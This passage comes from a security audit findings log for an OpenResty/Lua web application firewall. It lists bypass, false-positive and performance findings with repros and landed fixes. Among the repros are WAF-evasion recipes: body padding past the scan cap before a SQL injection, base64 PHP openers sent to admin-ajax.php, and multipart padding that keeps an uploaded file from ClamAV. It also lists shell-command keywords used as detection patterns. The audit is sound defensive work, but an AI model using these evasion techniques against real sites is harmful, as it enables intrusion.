KB):** the clean-URL gap is served by `location /`, which inherits the http-level `proxy_request_buffering on` — nginx buffers those bodies before proxying **regardless** of the WAF, so the new POST reads add only bounded **scan CPU** (≤ per-type budget), no new I/O. The buffering-off + WAF-inspected locations (media/archive block, openresty.conf:734, and the non-keyword `/sysadmin/…` PHP/admin regex) are protected by the shared gate: binary/media CTs skip, over-cap lengths skip, and chunked/unmeasurable bodies skip → large uploads keep streaming. **Residuals (documented):** a body-borne payload sent with a non-inspectable Content-Type to a path the origin parses anyway (CT-evasion), and bodies > the CL cap, are not read — narrower than the original all-paths gap. **FP surface:** same rules/tiers, but the block+autoblock-armed `WAF_SQLI`/`WAF_RCE`/`WAF_UPLOAD_FNAME` now scan bodies on more paths — same watch-the-hit-rates posture as F08 (widest of the cluster; `waf_security` `DRY_RUN` is the lever if FPs appear). Verified: `ct_is_inspectable` unit test (Test 11) + a full `waf_body_gate` read/skip truth table (inspectable/over-cap/chunked/binary × present & absent Content-Length, Test 12 in `cfm_waf_body_budget_test.lua`), the chunked-skip row confirmed to FAIL against the pre-fix gate. Adversarially reviewed (needs-fix → must-fix #1 large-PUT buffering + should-fix #2 chunked-cap-bypass both folded in). PR #1060.

---

<a id="f08"></a>
### F08 — WAF body reader hard-caps at 8192 bytes, defeating larger per-type scan budgets and letting payloads past byte 8192 escape all body rules

- **Status:** ☑ done — reader cap raised to the max per-type budget (8192 → 32768)
- **Severity:** medium · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm.lua:550`

**What & why.** get_req_body_for_waf() truncates to CFG.waf_body_max_len (default 8192) in both the in-memory (string.sub(data,1,max_len)) and spooled (f:read(max_len)) paths before the WAF ever sees it. The engine advertises larger per-Content-Type budgets (json 32768, multipart/xml 16384) via body_scan_budget, but the body was already truncated upstream so those budgets are unreachable. Classic body-size WAF evasion: prepend >8KB filler then place the SQLi/RCE/webshell payload; origin still processes the full body.

**Repro / cost.** POST /api/x with {"pad":"<8300 bytes>","q":"' UNION SELECT ..."}: reader truncates to first 8192 bytes (only pad), UNION payload never inspected, request reaches origin.

**Suggested fix.** Drive the read length from the Content-Type-selected budget (or set waf_body_max_len >= the largest per-type budget); optionally flag truncation so rules can fail-safe.

**Fix landed:** `waf_body_max_len` default raised **8192 → 32768** (`= max(body_scan_budget)`, the json budget) in `cfm.lua`, so the reader no longer truncates below the WAF's largest per-type budget — the per-type budget (`urlencoded 8192`, `json 32768`, `multipart/xml 16384`, verified via F09) is now the effective limit for the `get_norm_ab` rules, and a JSON/multipart/xml payload past byte 8192 is inspected. Same rules, same tiers — coverage only (blast radius = paths whose body is already read; F07 widens *which* paths, tracked separately). Well within `post_resume_max_len = 65536`, which already buffers the body for challenge replay, so no new buffering. Cross-referenced both sides (`cfm.lua` reader comment ↔ `cfm_waf.lua` `body_scan_budget` INVARIANT comment, §5). **Anti-drift guardrail** in `cfm_waf_body_budget_test.lua` (Test 10): computes the live max budget via `util.body_budget` and asserts `cfm.lua`'s actual `waf_body_max_len` default `>=` it — **verified to FAIL at the pre-fix 8192** and pass at 32768. If any budget is later raised above the cap (or the cap lowered), CI catches it. **Adversarially reviewed (ship with nits):** correctness/guardrail confirmed by trace + run; folded in a doc-precision fix (raw-body detectors like `detect_upload_filename` ignore `body_budget` and are truncated directly by this cap, above the nominal multipart budget) and an OPERATOR env-override warning (the guardrail checks only the source default, so `CFM_WAF_BODY_MAX_LEN` < max budget reopens F08). Two accepted side effects recorded for post-deploy monitoring: (1) the **scanned window** of already block+autoblock-armed families (`WAF_SQLI`/`WAF_RCE`/`WAF_UPLOAD_FNAME`) grows 8 KB → 16–32 KB — their block/FP burn-in predated it, so a legit 8–32 KB body matching a signature past byte 8192 now blocks/6h-bans (watch hit-rates); (2) symmetric ClamAV coverage gain — `cfm_clamav.lua` reads the same capped body, so multipart uploads whose `filename=` sits past byte 8192 now reach the scanner (relates to F17). PR #1058.

---

<a id="f10"></a>
### F10 — Exclude glob compiler diverges from Go: Lua `*`->`.*`/`?`->`.` cross `/` (Go uses `[^/]*`), and Lua ignores `[]` globs Go honours — silently widening the in-path WAF-off region

- **Status:** ☐ open
- **Severity:** medium · **Category:** regression (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_excl.lua:79`

**What & why.** Confirmed: glob_to_lua_pattern (line 79) translates '*'->'.*' and '?'->'.', which cross '/'; matches_rule (line 98) only enters the glob branch on '*'/'?'. Go's globToRegex (exclude_store.go:508-510) uses '[^/]*'/'[^/]' (no '/' crossing) and treats a rule as glob on any of '*?[]' (ContainsAny). For PATH excludes the two engines disagree: a common '/wp-content/*' or '/api/*' turns the in-path WAF off for the whole subtree in Lua but the Go log-driven per-IP scorer still scores deeper paths (can challenge/nft-ban a visitor the operator meant to exempt); and a bracket-class value like 'shop[12].gr' is a glob in Go but a literal in Lua. Directly contradicts the 'Go and Lua agree on every case' claim.

**Repro / cost.** Exclude '/wp-content/*' + request /wp-content/uploads/evil.php: Lua '^/wp%-content/.*$' matches (WAF skipped) but Go '^/wp-content/[^/]*$' does not (scorer still counts). Exclude 'shop[12].gr': Go excludes shop1.gr/shop2.gr; Lua excludes neither.

**Suggested fix.** Make Lua mirror Go: translate '*'->'[^/]*', '?'->'[^/]', detect '['/']' in the glob trigger and port class handling; add a multi-segment and bracket cross-engine test case.

**Fix landed (security half):** `glob_to_lua_pattern` now emits `[^/]*` for `*` and `[^/]` for `?`, so in-path wildcards no longer cross a path segment — matching Go's `globToRegex`. This closes the one-sided WAF-off **widening** (the security-relevant direction: Lua was matching MORE than Go on deep paths). Hosts unaffected (no `/`). Tests added to `cfm_waf_excl_test.lua` (`/wp-admin/*` !~ `/wp-admin/a/b`, `/?/b` !~ `///b`, `/*/b` one-segment). Branch `claude/lua-openresty-audit-cdmcc4`.

**Residual (tracked → F10b in the gaps list):** `[...]` bracket-class globs are still matched **literally** in Lua while Go treats them as a character class. For the intended class meaning this is the *narrower* direction (more protective in-path). One contrived exception is *wider* than Go: a request whose value literally contains the bracket text (rule `/foo[abc]`, request `/foo[abc]`) matches in Lua but not Go's anchored class regex — needs literal (usually percent-encoded) brackets in both rule and URL, so risk is minimal. Porting Go's bracket-class handling to Lua (incl. `[!`/`[^` negation and Lua set-escaping) is deferred — needs its own careful pass + cross-engine tests.

---

<a id="f11"></a>
### F11 — /wp-admin/ carve-out disables encoded/base64 <?php backdoor rules 437/438 on pre-auth admin-ajax.php

- **Status:** ☑ done — carve-out split; 438 kept at **logonly** on the pre-auth admin-ajax/admin-post surface (burn-in)
- **Severity:** medium · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf.lua:1597`

**What & why.** Rules 437/438 (encoded/base64 <?php opener in body) are skipped for the whole ^/wp-admin/ prefix on the false premise that such requests already passed WP cookie-auth. At the edge CFM inspects before WordPress authenticates, and /wp-admin/admin-ajax.php (and admin-post.php) serve unauthenticated wp_ajax_nopriv_* actions. So an unauthenticated attacker can POST a base64 <?php payload to admin-ajax.php and rule 438 will not fire. Same prefix also suppresses SSRF_FTP (line 844).

**Repro / cost.** POST /wp-admin/admin-ajax.php (no auth cookie) body action=<nopriv>&p=PD9waHA... : uri matches ^/wp%-admin/ -> whole 437/438 block skipped -> base64 <?php passes.

**Suggested fix.** Scope the carve-out to the actual FP endpoints and keep the base64 form (438) armed even there, or gate on a validated WP auth cookie.

**Fix landed:** **The finding's own premise (and the inline comment) that "438 base64 has no browser-legitimate FP source" is WRONG** — `docs/waf.md` FP case 5 documents a real production incident where WPCode / Code-Snippet plugins legitimately base64-POST `<?php` (`PD9waHA…`) to admin-ajax.php on every snippet save (the plugin JS base64-encodes it; the *browser* doesn't, but the plugin does). admin-ajax.php serves BOTH those authed saves AND unauthenticated `nopriv` actions, and the edge can't tell them apart (the WP cookie is spoofable), so *enforcing* 438 there would re-run that FP incident (real admins challenged). Chosen compromise (**logonly-first**, user-approved): the carve-out is split per-rule/per-endpoint — **437** (url/entity, FP-prone) stays fully suppressed on all `/wp-admin/`; **438** (base64) is recorded at **`logonly`** on the pre-auth `admin-ajax.php`/`admin-post.php` endpoints (visibility into pre-auth base64 smuggling with **zero** enforcement — no challenge, no block, and a `logonly` hit never reaches the autoblock feed, which ingests only `action=block`; no `WAF_BACKDOOR` rule is block-tier, so no ban even though the family is autoblock-armed), deliberately logonly regardless of 438's global tier during burn-in; the rest of `/wp-admin/` (authed editors) keeps both carved out; non-`/wp-admin/` unaffected. Operator watches the logonly stream (rule 438 on an admin-ajax URI) to separate real attacks from WPCode noise before any promotion. Test `cfm_waf_severity_test.lua` 77e rewritten: 438 on pre-auth admin-ajax/admin-post → logonly (not challenge), 437 suppressed on pre-auth, 438 suppressed on authed `/wp-admin/options.php`, 438 enforces on public path — **verified to FAIL against the pre-fix (both suppressed)**. `docs/waf.md` FP case 5 + rules-437/438 notes updated (§5). PR #1059.

---

<a id="f12"></a>
### F12 — detect_http_smuggling never fires: `|` alternation + case-sensitive precheck (rule 606)

- **Status:** ☐ open
- **Severity:** medium · **Category:** waf-bypass (axis a/c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:1904`

**What & why.** The verb match sl:match('(get|post|head|...|unlock)%s+[^%s]+%s+http/%d') relies on `|` alternation (literal in Lua patterns), so the whole SMUG_* detection is dead with no fallback. Compounding it, the precheck has(s,' http/') runs plain substring against the non-lowercased s while real smuggled request lines carry uppercase 'HTTP/1.1', so even the precheck returns nil.

**Repro / cost.** Body/arg containing 'GET /admin HTTP/1.1': precheck fails (uppercase), and the alternation cannot match; rule 606 inert for every real smuggling payload.

**Suggested fix.** Lowercase before precheck and replace the alternation with a verb table walked in a loop.

**Fix landed:** `smug_check` now lowercases FIRST (fixes the uppercase-`HTTP/` precheck miss), then walks a module-scope `SMUG_VERBS` list testing each at a word boundary (`%f[%a]verb%s+[^%s]+%s+http/%d`). Tier kept at **logonly** (rule 606, observe-only for burn-in). Test `cfm_waf_backtick_smuggling_test.lua` (GET/post/PUT/DELETE incl. uppercase + body + FP negatives; tested at block for a crisp assertion per the rule-319 convention). Known gap left as-is (out of audit scope): a `%20`-encoded separator isn't matched by `%s+` — acceptable at logonly. Branch `claude/lua-openresty-audit-cdmcc4`. **Code-review hardening:** the request-target is now anchored to start with `/` (origin-form), so English prose like `connect to http/2` / `options for http/2` no longer trips the rule (FP negatives added).

---

<a id="f13"></a>
### F13 — Base64 PHP-object-injection check uses malformed `%bo%:` pattern that never matches serialized objects (B64_OBJ_INJECT dead, rule 304)

- **Status:** ☐ open
- **Severity:** medium · **Category:** correctness (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:449`

**What & why.** detect_b64_injection tests d:match('%bo%:%d+%:"') / d:match('%bc%:%d+%:"'). Lua's %bxy consumes the two bytes after %b as the open/close pair, so %bo%: parses as a balanced match of 'o'...'%' then ':%d+:"'. Real decoded PHP serialized objects (o:8:"stdclass") contain no '%', so the balanced match fails and the sub-rule never fires. Intended pattern is o:%d+:" / c:%d+:".

**Repro / cost.** POST body with base64 of O:8:"stdClass":... -> decoded lowercased o:8:"stdclass" -> %bo%:%d+%:" returns nil -> B64_OBJ_INJECT never returned.

**Suggested fix.** Use plain sequences o:%d+:" / c:%d+:" (and a:%d+:{ for arrays), dropping %b.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f14"></a>
### F14 — value_looks_shelly word list contains common tokens (host, id, ping, more, less, head, tail, env, cat, ls, w) that FP-challenge legit system=/command= dispatcher values

- **Status:** ☑ done — hyphen no longer a token separator + ambiguous common words pruned from CMD_PARAM_SHELL_WORDS
- **Severity:** medium · **Category:** fp (axis a) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:1062`

**What & why.** detect_cmd_param_key (rule 310, challenge) fires CMD_SYSTEM/CMD_COMMAND when the dispatcher value tokenises to a CMD_PARAM_SHELL_WORDS entry, but the list includes very common words. '-' splits tokens (underscore does not), so hyphenated legit values break into bare tokens that hit the list. Unlike cmd=, system=/command= have no elFinder/verb carve-out, so a legit value trips a CHALLENGE that breaks XHR/JSON consumers (the 'Data is not JSON' class incident).

**Repro / cost.** ?system=host-01 -> {host,01} -> challenge; ?command=item-id -> {item,id} -> challenge; ?command=more -> challenge. (All confirmed firing against source via luajit before the fix.)

**Suggested fix.** Drop ubiquitous single-word tokens (w,id,host,more,less,head,tail,ping,env,cat) or require an accompanying metachar; extend the value-precise carve-out to system=/command= for known app verbs.

**Fix landed (user chose "Balanced" prune).** Two changes to `value_looks_shelly` / `CMD_PARAM_SHELL_WORDS`: **(1) structural** — the word tokeniser is `[%w_%-]+` (was `[%w_]+`), so hyphen is part of a token, not a separator; legit compound identifiers (`host-01`, `item-id`, `us-east-1`) stay whole and no longer shatter into bare shell words. A real `cmd arg` separates with whitespace (`uname -a` → space-split → `uname` still matches), so no probe is lost. **(2) prune** — removed the ambiguous common words `id, w, ps, pwd, ls, env, cat, head, tail, less, more, host, fetch, route, ping, dig, arp` (kept the unambiguous tools: `whoami, uname, hostname, wget, curl, nc, netcat, socat, telnet, ssh, scp, nslookup, ifconfig, netstat, iptables, chmod, chown, rm, mv, cp, mkdir, touch, ln, bash/sh/dash/zsh/ksh/csh, python*/perl/ruby/php/lua/node, exec/system/passthru/eval/shell_exec`). **No coverage regression for weaponized attacks:** a metachar (`id;`), a path (`cat /etc/passwd`), or a still-listed tool (`curl http://…`, `bash -i`) all still fire via the metachar/path/token checks; the **accepted trade** is that a bare, un-metachar'd recon probe (`command=id`, `system=ls`, `ping evil.com`) is no longer flagged — the precise class that collided with legit values. Verified empirically (luajit): 14 FP candidates → nil, 9 real-attack forms → still CMD_*. Test 70 (`cfm_waf_severity_test.lua`) rewritten: added 10 F14 FP-regression cases (host-01/item-id/more/host/id/env/cat/fetch/head + bare cmd=id/system=ls), a pure hyphen-tokeniser guard on a *kept* word (`system=ssh-key`, fails pre-fix), and the weaponized-`id;`/`cat /etc/shadow` positives; the 4 now-intentionally-non-firing bare probes removed from the TP set; the elFinder-no-connector case re-pointed at a still-listed verb (`cmd=mkdir`). **Verified to FAIL against the pre-fix detector** (all 10 F14 FP cases fire). **Adversarially reviewed (ship-with-nits):** proven strictly fire-reducing (no listed word contains a hyphen, so the new tokeniser can only remove matches — no new FP possible), no shell-executable evasion (`curl-s` isn't a command a shell runs), weaponized forms still fire. The reviewer noted a kept/dropped **asymmetry** among DNS/network recon (`nslookup` kept; `ping`/`dig`/`host` dropped) and that bare `command=env` dumps the environment — a deliberate **FP-based partition** (keep the rare-as-legit-value tools, drop the FP-prone `host`/`ping`/`env` config-selector/health-check/hostname collisions); operator confirmed keep-as-is. Bare un-metachar'd recon of a dropped word (`command=env`, `cmd=dig evil.com`, `system=ls /home`) is the accepted residual, backstopped by the metachar/path checks for any weaponized form. PR #TBD.

---

<a id="f15"></a>
### F15 — CT_BAD_BOUNDARY false-positives on RFC-legal multipart boundaries (`=`,`+`,`/`) used by JavaMail/SOAP/Python email clients (rule 604)

- **Status:** ☐ open
- **Severity:** medium · **Category:** fp (axis a) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:1722`

**What & why.** The boundary validator `not bval:match('^%-*[0-9A-Za-z%-%_%.]+$')` only permits dashes, alphanumerics, _ and . RFC 2046 bcharsnospace also allows '()+_,-./:=?, and real producers emit '=' (JavaMail '----=_Part_0_...', Python email '===...=='). These are server-to-server/API clients that cannot solve an interactive JS challenge, so the POST breaks outright.

**Repro / cost.** POST Content-Type: multipart/related; boundary="----=_Part_0_123.456": after %-* consumes dashes the next char '=' is outside the class, anchored match fails, CT_BAD_BOUNDARY fires -> rule 604 challenge on legit traffic.

**Suggested fix.** Widen the boundary class to RFC 2046 bcharsnospace, or validate length<=70 + printable-ASCII.

**Fix landed:** widened the `CT_BAD_BOUNDARY` validator's char class from `[A-Za-z0-9._-]` to the exact RFC 2046 `bcharsnospace` set — `[0-9A-Za-z'()+_,./:=?-]` — so a boundary using the RFC-legal `=`/`+`/`/`/`:`/`(`/`)` chars is accepted. Chars OUTSIDE `bcharsnospace` (space, control bytes, `<` `>` `;` `"` `@` `$` `%` backtick) — the ones that can actually desync a WAF-vs-PHP multipart split — are still rejected, so the anti-evasion purpose is preserved; the change only stops rejecting RFC-legal boundaries. Verified empirically (luajit): 6 legit producer boundaries (JavaMail `----=_Part_0_…`, Python `====…==`, SOAP `:`/`/`, `+`, `( )`, browser alnum) → nil; 4 malformed (`<`, `@`, `$`/backtick, `%00`) → still `CT_BAD_BOUNDARY`. Test 78b added (`cfm_waf_severity_test.lua`) covering both sides; **5 of the 6 RFC-legal cases FAIL against the pre-fix narrow class** (the 6th, browser-alnum `----WebKitFormBoundary…`, is a control that passes both) — real regression guards. **Adversarially reviewed (ship-with-nits):** char class proven correct (all 12 bcharsnospace specials accepted, 22 non-bcharsnospace incl. control bytes still fire), and **no evasion** — the boundary is validate-only here; the sole body-splitter (`detect_polyglot_upload`) does its own extraction + a literal `find`, invariant to the newly-allowed chars, so no WAF-vs-PHP desync. Folded in three doc/comment nits (`,` unreachable-via-extraction note, stale test comment, this phrasing). PR #TBD.

---

<a id="f16"></a>
### F16 — Encoded-<?php opener rule (437) false-positives on legit content POSTs (comments, forum posts, rich-text) at challenge tier

- **Status:** ☑ done — cut the FP-prone URL/HTML-entity/JS-unicode encoded-opener forms from rule 437; kept the two attack-shaped forms (438 base64, 437 JS `\x` hex-escape)
- **Severity:** medium · **Category:** fp (axis a) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:3794`

**What & why.** detect_php_encoded_opener flags any body containing URL-encoded %3c%3fphp or HTML-entity &lt;?php. A browser url-encodes a typed literal <?php to exactly %3C%3Fphp, and editors HTML-escape pasted PHP to &lt;?php. Any front-end that accepts text mentioning PHP (comment, forum, paste tool, helpdesk, CMS) trips it. The dispatcher runs 437 at challenge and carves out ONLY ^/wp-admin/; non-browser POSTers (mobile apps, API clients, XML-RPC) hard-fail the challenge.

**Repro / cost.** POST a bbPress/forum reply with field value '<?php echo 1; ?>' to a non-/wp-admin path -> browser sends %3C%3Fphp... -> URL_PHP_OPENER -> WAF_BACKDOOR challenge; API client cannot solve.

**Suggested fix.** Widen the carve-out to authenticated content-submission paths, or hold URL/HTML-entity forms at logonly and only promote the base64 form (438).

**Decision (user-approved: "remove, not park at logonly").** logonly is a burn-in bridge, not an end state — the real call is remove-the-wrong-rule vs promote-the-good-rule. Verified against source: the URL / HTML-entity / JS-unicode forms are a **mis-designed signal for request bodies** — an `application/x-www-form-urlencoded` body is url-encoded *in its entirety*, so `%3c%3fphp` is the *normal on-wire encoding* of any typed `<?php`, not evasion; editors HTML-escape; Go/JS JSON encoders escape a literal `<` to its `\u`-prefixed unicode form by default. And they are **redundant for real attacks**: the PHP webshell-body scorer (rule 404, `detect_php_webshell_body`) `normalize()`-url-decodes the body (`cfm_waf_detectors.lua:260`) and scores `<?php`(+2) + exec-marker (e.g. `system(`) + superglobal (`$_GET`) ≥ 5 at `challenge`, so a marker-bearing payload (`<?php system($_GET…`) is caught by it regardless. (Note rule 320 `detect_rce` is NOT the catcher — it scans `normalize(uri.."?"..args)` only, never the body.) There is **no** bare-plaintext-`<?php`→enforce rule for form bodies (404 needs the exec marker + superglobal; rule 432 needs a binary magic prefix), so 437's *unique* contribution over 404 was firing on a bare opener with no attack markers — precisely the legit-content case.

**Fix landed:** cut `URL_PHP_OPENER`, `URL_SHORT_OPENER`, both `HTML_ENTITY_OPENER` variants and `JS_UNICODE_OPENER` from `detect_php_encoded_opener`. **Kept two attack-shaped forms:** 438 `B64_PHP_OPENER` (base64, boundary-anchored, unchanged) and 437 `JS_HEX_OPENER` (`\x3c\x3fphp`). js-hex was kept deliberately — it is the **only** encoded form `normalize()` does not unwrap (`\xNN` ≠ `%xx`), and a url-encoded backslash is `%5C` so a form body can't carry a literal `\x3c`, making it non-redundant *and* ~zero-FP (the inverse trade from the cut forms: those were high-FP + redundant, js-hex is low-FP + unique). Dispatcher tier/`/wp-admin/` carve-out logic UNCHANGED (437 stays at challenge; the F11-tuned carve-out untouched) — only comments updated. **FP eliminated:** legit comment/forum/contact/API POSTs containing `<?php` no longer challenge (verified). **No coverage regression for real attacks:** marker-bearing payloads → rule 404 `detect_php_webshell_body` on its url-decoded body (challenge, verified empirically: `reason=WAF_PHP_WEBSHELL_BODY:RAW_SYSTEM_GET rid=404`); base64 → 438; raw `.php`/polyglot uploads → 401/402/412/432; written webshell on later request → 413. Residual (documented): a markerless url/entity-encoded first-stage dropper whose functions dodge rule 404's marker lists loses this one defense-in-depth layer (backstopped by 413). Tests (`cfm_waf_backdoor_test.lua`): 437 js-hex positive (→ id 437), routing split rewritten (js-hex↔base64), and an **F16 cut block** asserting url/short-tag/html-numeric/html-named/js-unicode forms no longer fire — **verified to FAIL when the URL form is re-added** (non-vacuous). `docs/waf.md` rules-437/438 section + FP case 5 updated (§5). PR #TBD.

---

<a id="f17"></a>
### F17 — ClamAV upload scan silently skipped when multipart filename= sits beyond the 8KB WAF body cap

- **Status:** ☐ open
- **Severity:** medium · **Category:** security (axis c) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_clamav.lua:82`

**What & why.** has_file_part()/extract_filename() decide WHETHER to enqueue an upload for ClamAV by scanning ngx.ctx.waf_body, which is truncated to 8192 bytes upstream (get_req_body_for_waf). notify() is the only trigger to the Go /nginx/upload scanner. An attacker controls multipart ordering and places a >8KB non-file field before the file part, pushing the file part's filename= past 8192 bytes; waf_body then contains no 'filename=', has_file_part() returns false, notify() returns, and the malware upload is never scanned even though the full spooled body is available.

**Repro / cost.** POST multipart with field pad=<9000 bytes> before file field evil.php: waf_body has no filename= -> has_file_part false -> notify returns -> ClamAV never sees evil.php.

**Suggested fix.** Detect multipart file presence from Content-Type boundary + a bounded scan of the spooled body_file (or always notify for multipart and let the Go side decide from the full body).

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f19"></a>
### F19 — sslcollector re-parses PEM cert+key to DER on every TLS handshake (parsed material never cached)

- **Status:** ☐ open
- **Severity:** medium · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/sslcollector.lua:743`

**What & why.** set_cert() runs in ssl_certificate_by_lua on every full handshake. The worker store holds only raw PEM strings, so set_cert calls ssl.parse_pem_cert/parse_pem_priv_key per handshake for the matched host — one of the more expensive per-handshake operations (PEM->DER + RSA/EC key parse), repeated per connection although certs change ~hourly. lua-resty-core permits caching the returned cdata at module level.

**Repro / cost.** Busy vhost with N full handshakes/sec (session-resumed handshakes skip this) re-parses the same cert+key N times/sec.

**Suggested fix.** Parse cert+key once at ingest (store_pair/ingest_dumpall), cache the parsed cdata, and have set_cert reuse it; pcall-guard the parse and drop bad certs off the hot path.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f20"></a>
### F20 — cfm_stats decisions_stats/sslcache_stats call get_keys() with large N, locking the hot cfm_decisions dict on every dashboard poll

- **Status:** ☐ open
- **Severity:** medium · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_stats.lua:134`

**What & why.** decisions_stats does d:get_keys(25000) on the 64m cfm_decisions dict and sslcache_stats does d:get_keys(8000). get_keys locks the entire dictionary for the scan, blocking all workers. cfm_decisions is touched by every request's access-phase decision lookup, and lua-stats is a pollable/auto-refreshing dashboard endpoint, so each poll stalls all request processing while up to 25000 keys are enumerated.

**Repro / cost.** With tens of thousands of live keys, leave the dashboard auto-refreshing; each poll holds the cfm_decisions lock for the full get_keys(25000) scan, stalling concurrent access-phase lookups.

**Suggested fix.** Maintain approximate counters via incr/decr, or cache the breakdown in a short-TTL worker-local entry; never scan cfm_decisions on every poll.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f21"></a>
### F21 — cfm_rules throttle lock contention fails toward 429, over-throttling legit bursts from shared/NAT IPs

- **Status:** ☐ open
- **Severity:** medium · **Category:** fp (axis a) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_rules.lua:58`

**What & why.** throttle_hit spins up to 10x ngx.sleep(0.001) to acquire a per-(profile,host,ip) lock; on timeout it returns hit=true (throttle) regardless of token availability — opposite of the SH-missing branch which fails open. Because many concurrent requests from one IP contend on one lock (carrier-grade NAT, corporate proxies, shared reverse proxies), lock losers are 429'd even with bucket capacity, so the effective throttle is stricter than configured and legit users behind a shared IP are throttled together.

**Repro / cost.** IP under soft_bot (rate 2/s, burst 20) sends 30 concurrent requests; losers of the 10ms lock spin get hit=true and are 429'd irrespective of remaining tokens.

**Suggested fix.** On lock-acquisition timeout fail OPEN (match SH-missing policy) or do a best-effort lock-free token update; reconsider keying purely on IP for shared-NAT.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f22"></a>
### F22 — UA-emergency throttle churns the shared cfm_decisions dict (3 writes + spin-lock per request) under the bot wave it targets

- **Status:** ☐ open
- **Severity:** medium · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_ua_emergency.lua:322`

**What & why.** throttle() reuses ngx.shared.cfm_decisions (the 64m dict read on every request). Per matching request it spin-acquires a per-UA lock (_SH:add + sleep loop up to 10x), then _SH:set(bucket), then _SH:delete(lock) — up to three writes plus a spin-loop, all requests of one UA serialized through one box-wide lock. This happens precisely during a high-rate bot wave when cfm_decisions is under max read pressure, adding shdict mutex contention that slows decision-cache gets for unrelated legitimate traffic.

**Repro / cost.** Emergency throttle on a UA sending 5000 req/s: 5000/s add+sleep-spin + set + delete on cfm_decisions, contending with every other request's SH:get.

**Suggested fix.** Use a dedicated shared_dict and an atomic incr-based token bucket (no per-request lock churn on the primary decision cache).

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f24"></a>
### F24 — is_known_legit_xmlrpc normalizes args AND body on every request before the cheap /xmlrpc.php URI gate

- **Status:** ☐ open
- **Severity:** medium · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm_waf_detectors.lua:850`

**What & why.** is_known_legit_xmlrpc() runs normalize(cap(args)) and normalize(cap(body)) BEFORE the `if not has(uri,'/xmlrpc.php') then return false end` guard. normalize lowercases (fresh allocation) and, on a '%', runs two url_decode gsub passes. It is called ungated from cfm_waf.lua:1095 (rule 26) and 1135 (rule 28) on every WAF-inspected request, yet returns false for ~all traffic (URI not /xmlrpc.php), so every request with a query string or body pays 2 wasted normalize passes (up to 2x across both call sites).

**Repro / cost.** GET /search?q=hello (or any form POST) to a non-xmlrpc vhost: rule 26 lowercases+double-url-decodes args then returns false at the URI check; pure waste, per request.

**Suggested fix.** Move the lower(uri)+has(uri,'/xmlrpc.php') check to the very top of the function before the args/body normalize calls.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f25"></a>
### F25 — Per-IP geo results and abuse counters share the high-churn cfm_decisions dict; geo uses a 3.3x-longer 300s TTL and negatively caches transient lookup failures

- **Status:** ☐ open
- **Severity:** medium · **Category:** perf (axis b) · **Verify:** CONFIRMED
- **Location:** `configs/lua/cfm.lua:1121`

**What & why.** geo_country_cached() is called unconditionally for every bridge-step request (country always passed to Go, no geo-active gate) and stores one entry per source IP in cfm_decisions with a 300s TTL — 3.3x the 90s decision-allow TTL. Under a high-distinct-IP flood (exactly when the decision cache matters for shedding bridge RPCs) the long-lived geo entries dominate the 64m dict and LRU-evict decision allows AND the security counters that also live there (cfm_rules throttle buckets, ua_emergency state, waf-push dedup), silently weakening rate/abuse protection during the flood. Separately, geo_country() returns '' for both 'not found' and 'geo errored', and '' is cached 300s, so a transient mmdb hiccup poisons that IP's country as empty for 5 minutes.

**Repro / cost.** Spray 100k+ distinct IPs over ~5 min: each writes geo|<ip> (300s) into cfm_decisions; once 64m is pressured, LRU evicts 90s decision allows and abuse counters -> repeat visitors re-hit the bridge and throttle/emergency state resets mid-flood.

**Suggested fix.** Gate geo on a bridge-published 'geo rules active' flag and move geo (and eviction-sensitive abuse counters) to their own shared_dict with TTL<=90s; distinguish lookup-failure from no-country so failures are not cached 300s.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f26"></a>
### F26 — Ingest socket bufio.ReadString does not bound line length — unbounded memory (comment falsely claims a 256KB bound)

- **Status:** ☐ open
- **Severity:** medium · **Category:** dos (axis b/c) · **Verify:** CONFIRMED
- **Location:** `internal/webdetector/ingest_socket.go:155`

**What & why.** serveConn reads lines with br.ReadString('\n'); the inline comment claims an oversized line returns ErrBufferFull and is dropped. False: ReadString/ReadBytes uses collectFragments, which on ErrBufferFull copies the 256KB chunk into a growing [][]byte and keeps reading until '\n' or EOF. A cfm-group sender streaming newline-free data causes unbounded RSS growth in the per-connection goroutine (gigabytes fit within the 60s idle deadline over a local socket). The FileTailer path this mirrors uses bufio.Scanner which enforces a max token size; the socket path lost that bound.

**Repro / cost.** Connect to /run/cfm/ingest.sock and write >256KB with no '\n' -> collectFragments accumulates all of it -> sustained newline-free stream -> OOM.

**Suggested fix.** Bound the line: use bufio.Scanner with a fixed max-token like FileTailer, or ReadSlice/ReadLine and drop-until-newline on overflow; fix the comment.

**Fix landed:** _(pending — record commit/PR here)_

---

<a id="f27"></a>
### F27 — sslcollector socket restart race: old listener's Close() unlinks the freshly-bound new socket, breaking cert delivery until next restart

- **Status:** ☑ done — `SetUnlinkOnClose(false)` so a restarting server's old Close can't unlink the new inode; disable/Stop remove the name explicitly
- **Severity:** medium · **Category:** regression (axis b) · **Verify:** CONFIRMED
- **Location:** `internal/sslcollector/socketapi.go:312`

